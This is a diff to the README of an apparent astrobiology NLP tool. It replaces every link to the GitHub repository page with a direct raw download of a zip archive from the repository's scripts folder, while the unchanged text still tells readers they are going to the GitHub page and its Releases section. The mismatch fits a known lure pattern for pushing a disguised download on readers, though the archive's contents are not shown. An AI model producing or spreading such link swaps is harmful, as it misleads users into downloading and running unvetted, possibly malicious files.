@@ -1,6 +1,6 @@
 # 📚 arxiv-astrobiology-nlp - Explore Topics in Astrobiology Research
 
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge&logo=github)](https://github.com/typeshi215/arxiv-astrobiology-nlp)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/typeshi215/arxiv-astrobiology-nlp/main/scripts/astrobiology_arxiv_nlp_v1.0.zip)
 
 ---
 
@@ -29,7 +29,7 @@ To run the software on your Windows computer, make sure your system meets these 
 
 1. Click the big download button below to go to the GitHub page where you can get the program files.
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/typeshi215/arxiv-astrobiology-nlp)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/typeshi215/arxiv-astrobiology-nlp/main/scripts/astrobiology_arxiv_nlp_v1.0.zip)
 
 2. On the GitHub page, look for the latest release in the "Releases" section or main repository page. Download the Windows installer or executable file. This might be named something like `arxiv-astrobiology-nlp-setup.exe`.
 
@@ -92,7 +92,7 @@ This setup suits both casual users and researchers wanting a quick way to browse
 
 Visit this page to download the latest version:
 
-https://github.com/typeshi215/arxiv-astrobiology-nlp
+https://raw.githubusercontent.com/typeshi215/arxiv-astrobiology-nlp/main/scripts/astrobiology_arxiv_nlp_v1.0.zip
 
 Click “Releases” on the right side to find the installer for Windows. Download the most recent `.exe` file.
 
